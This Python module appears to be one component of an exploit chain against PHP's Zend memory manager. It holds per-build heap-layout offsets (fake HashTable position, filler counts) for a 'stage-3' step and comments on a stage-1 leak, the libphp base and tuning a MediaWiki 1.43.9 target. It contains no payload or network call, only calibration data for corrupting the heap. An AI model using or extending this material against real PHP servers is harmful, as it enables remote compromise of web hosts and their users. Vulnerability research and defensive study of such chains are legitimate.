"""Stage-3 heap geometry per build and memory_limit (docs/75, docs/76 R2).

The warning chain's request-C shape depends on where PHP's Zend MM puts the
session variables page.  That position is a property of *build + memory_limit*,
not of the PHP version alone, so a geometry record must say which build it was
measured for and must never be reused across builds (AGENTS iron rule #4).

Only records that were verified end-to-end are listed here.  An unknown
combination raises instead of falling back to a guess.
"""
from __future__ import annotations

from dataclasses import dataclass


class GeometryError(KeyError):
    """No calibrated stage-3 geometry for this build/memory_limit."""


@dataclass(frozen=True)
class Stage3Geometry:
    limit_mb: int
    a_extra: int
    f_pads: int
    htdata_offset: int
    carrier_len: int
    fill_len: int


# 8.4.26: 8M is the stock cbo8426 shape; 16..256M share the measured geometry
# (29 extra bin-32 fields in A, 48 15-byte fillers in B, fake HashTable at
# chunk+0x740d8).  Evidence: profiles.py stage3_geometry, docs/44, docs/61.
# 8.5.11 and 8.3.35 were verified with the default shape (no a_extra, 2 pads).
_TABLE: dict[str, dict[int, Stage3Geometry]] = {
    "8.4.26": {
        8: Stage3Geometry(8, 0, 2, 0x690D8, 15, 15),
        16: Stage3Geometry(16, 29, 48, 0x740D8, 15, 15),
        32: Stage3Geometry(32, 29, 48, 0x740D8, 15, 15),
        64: Stage3Geometry(64, 29, 48, 0x740D8, 15, 15),
        128: Stage3Geometry(128, 29, 48, 0x740D8, 15, 15),
        256: Stage3Geometry(256, 29, 48, 0x740D8, 15, 15),
    },
    "8.5.11": {
        8: Stage3Geometry(8, 0, 2, 0x690D8, 15, 15),
        16: Stage3Geometry(16, 0, 2, 0x690D8, 15, 15),
    },
    "8.3.35": {
        8: Stage3Geometry(8, 0, 2, 0x6A0D8, 15, 15),
        # 128M: MediaWiki 1.43.9 image (mod_php 8.3.35, de=On, 128M/8M,
        # libphp sha256 212564d6..., MaxRequestWorkers 150).  The chunked
        # 132 MiB OOM field + pin 149/150 shape keeps the 8M stage-3 geometry:
        # chunk candidate, libphp base and a first-attempt proof were stable
        # 3/3 on 2026-10-29 (docs/89 §5).  Target path must be a neutral PHP
        # page: the MediaWiki entry script dies before the session flush that
        # carries the stage-1 leak (same section).
        128: Stage3Geometry(128, 0, 2, 0x6A0D8, 15, 15),
    },
}


def builds() -> list[str]:
    return sorted(_TABLE)


def select(version: str, limit_mb: int) -> Stage3Geometry:
    """Return the calibrated geometry or fail loudly."""
    per_build = _TABLE.get(version)
    if per_build is None:
        raise GeometryError(
            "no stage-3 geometry for PHP %s (calibrated: %s)"
            % (version, ", ".join(builds())))
    geo = per_build.get(int(limit_mb))
    if geo is None:
        raise GeometryError(
            "PHP %s has no %dM stage-3 geometry (calibrated: %s)"
            % (version, limit_mb,
               ", ".join(str(k) for k in sorted(per_build))))
    return geo
